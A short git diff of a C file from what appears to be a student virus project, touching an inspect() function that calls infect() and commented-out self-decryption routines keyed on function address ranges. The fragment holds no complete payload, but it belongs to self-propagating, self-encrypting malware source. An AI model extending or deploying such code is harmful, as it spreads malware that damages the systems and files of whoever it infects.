@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/31 19:28:21 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/03/31 20:56:35 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/01 18:07:47 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -14,9 +14,7 @@
 
 void	inspect(t_data *data, char *path)
 {
-//	revert_two(&data->key, (char*)locate, (size_t)inspect - (size_t)locate);
-//	update_two(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect);
-//	printf("inspect key = %lx\n", data->key.two);
+	/* revert_one(&data->key, (char*)locate, (size_t)inspect - (size_t)locate); */
 
 #ifdef DEBUG
 	char de[] = "inspect\t \n";
@@ -59,6 +57,9 @@ void	inspect(t_data *data, char *path)
 #endif
 
 ERR:
-//	revert_two(&data->key, (char*)infect, (size_t)inject - (size_t)infect);
+
+	/* update_one(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect); */
+	/* revert_one(&data->key, (char*)infect, (size_t)inject - (size_t)infect); */
+
 	infect(data);
 }
